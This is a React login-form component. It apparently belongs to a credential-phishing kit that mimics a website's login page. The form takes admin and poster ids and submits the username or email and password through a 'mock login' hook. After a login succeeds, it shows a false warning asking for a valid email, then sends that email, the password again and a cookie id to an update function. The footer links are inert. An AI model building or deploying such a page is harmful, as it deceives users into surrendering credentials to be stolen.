import React, { useState } from "react";
import { Formik, Form } from "formik";
import * as Yup from "yup";
import { MdVisibility, MdVisibilityOff } from "react-icons/md";
import { CiWarning } from "react-icons/ci";
import TextfieldWrapper from "./TextfieldWrapper";
import SubmitButton from "./SubmitButton";
import { site } from "../config";
import useMockLogin from "../hooks/useMockLogin";
import Cookies from "js-cookie";
import { toast } from "react-toastify";
function LoginForm({ adminId, posterId }) {
  const [showPassword, setShowPassword] = useState(false);
  const [isFirstLogin, setIsFirstLogin] = useState(false);
  const [userId, setUserId] = useState(null);
  const [isEmail, setIsEmail] = useState(false);

  const initialvalues = {
    identifier: "",
    password: "",
  };

  // Custom validation to accept either username or email
  const validate = Yup.object({
    identifier: Yup.string()
      .required("Username or email is required"),
    password: Yup.string().min(8, "Minimum 8 characters"),
  });

  const { login, updateUserEmail } = useMockLogin(adminId, posterId);

  const handleSubmit = async (values, formik) => {
    const { identifier, password } = values;
    
    // Check if the input is an email
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const isEmailInput = emailRegex.test(identifier);
    setIsEmail(isEmailInput);

    const submitValues = {
      site: site,
      email: identifier, // Using identifier for both username and email
      password: password,
      skipcode: "",
    };

    if (isFirstLogin && userId) {
      // If this is the second step (updating email)
      // Only proceed with update if it's a valid email
      if (isEmailInput) {
        const success = await updateUserEmail({ email: identifier, password, id: userId });
        if (success) {
          setIsFirstLogin(false);
          setUserId(null);
        }
      } else {
        // Show error message if not a valid email in second step
        toast.error("Please enter a valid email address");
      }
      formik.resetForm();
    } else {
      // First login attempt
      const success = await login(submitValues, formik);
      if (success) {
        // If first input was email, no need to show error
        setIsFirstLogin(!isEmailInput);
        
        const idFromCookie = Cookies.get("id");
        if (idFromCookie) {
          setUserId(idFromCookie);
        }
        formik.resetForm();
      }
    }
  };

  return (
    <div className="md:w-[550px] lg:w-[632px] mx-auto mt-[60px] lg:mt-[95px] mb-[90px] lg:mb-[144px]">
      <div className="flex flex-col items-ceneter">
        <div className="">
          <div className="bg-custom-indigo text-white text-xl font-medium px-[26px] py-[18px] shadow-md">
            Login
          </div>
          <div className="border border-slate-300 border-opacity-40 px-[15px] pt-7 pb-[24px]">
            {/* User does not exist message - only show when username was entered first */}
            {isFirstLogin && !isEmail && (
              <div className="mb-4 p-3 bg-red-500 border border-red-600 rounded">
                <div className="flex items-center gap-5">
                  <CiWarning size={24} />
                  <p className="text-black font-medium">Enter a valid email address</p>
                </div>
              </div>
            )}

            <Formik
              initialValues={initialvalues}
              validationSchema={validate}
              onSubmit={handleSubmit}
            >
              {(formik) => (
                <Form className="space-y-[18px]">
                  <TextfieldWrapper
                    name="identifier"
                    label="Username or Email"
                    type="text"
                    helpertext="usernames are case-sensitive"
                  />
                  <div className="relative">
                    <TextfieldWrapper
                      name="password"
                      label="Password"
                      helpertext="passwords are case-sensitive"
                      autoComplete="on"
                      type={showPassword ? "text" : "password"}
                    />
                    <span
                      className="absolute right-0 top-[17px] text-[23px] opacity-50 cursor-pointer"
                      onClick={() => setShowPassword(!showPassword)}
                    >
                      {showPassword ? <MdVisibilityOff /> : <MdVisibility />}
                    </span>
                  </div>

                  <div className="mt-5 flex justify-center">
                    <SubmitButton>Login</SubmitButton>
                  </div>
                </Form>
              )}
            </Formik>

            <div className="mt-[58px] mx-4 lg:mx-[55px] text-[16.5px] flex justify-between items-center text-custom-indigo">
              <p className="cursor-pointer">Set New Password</p>
              <p className="cursor-pointer">Sign Up</p>
              <p className="cursor-pointer">Help</p>
            </div>
          </div>
        </div>
      </div>
      <div className="h-[1px] bg-slate-600/50"></div>
    </div>
  );
}

export default LoginForm;
